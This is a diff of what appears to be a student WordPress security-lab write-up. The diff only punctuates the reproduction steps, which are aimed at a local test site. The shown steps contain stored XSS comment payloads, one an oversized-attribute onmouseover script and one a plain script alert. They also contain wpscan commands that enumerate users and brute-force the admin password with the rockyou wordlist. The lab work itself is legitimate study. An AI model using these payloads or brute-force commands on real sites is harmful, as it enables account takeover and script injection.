@@ -13,8 +13,8 @@ Time spent: **6** hours spent in total
     - Fixed in version: 4.3
   - [x] GIF Walkthrough: https://imgur.com/a/xWQw0
   - [x] Steps to recreate: 
-		go to wpdistillery.local
-		go to comment section of a post
+		go to wpdistillery.local;
+		go to comment section of a post;
 		comment: <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
   - [x] Affected source code: core wp
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
@@ -25,8 +25,8 @@ Time spent: **6** hours spent in total
     - Fixed in version: 4.3
   - [x] GIF Walkthrough: https://imgur.com/a/BpbID
   - [x] Steps to recreate: 
-		go to wpdistillery.local
-		go to comment section of a post
+		go to wpdistillery.local;
+		go to comment section of a post;
 		comment: <script>alert('XSS');</script>
   - [x] Affected source code: core wp
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
@@ -37,9 +37,9 @@ Time spent: **6** hours spent in total
     - Fixed in version: 4.7
   - [x] GIF Walkthrough: https://imgur.com/a/EqxpY
   - [x] Steps to recreate: 
-		open terminal
-		use command: wpscan --enumerate u --url wpdistillery.local
-		download text file rockyou-75.txt
+		open terminal;
+		use command: wpscan --enumerate u --url wpdistillery.local;
+		download text file rockyou-75.txt;
 		use command: wpscan --url wpdistillery.local --wordlist '/root/rockyou-75.txt' --username admin
 
   - [x] Affected source code: core wp
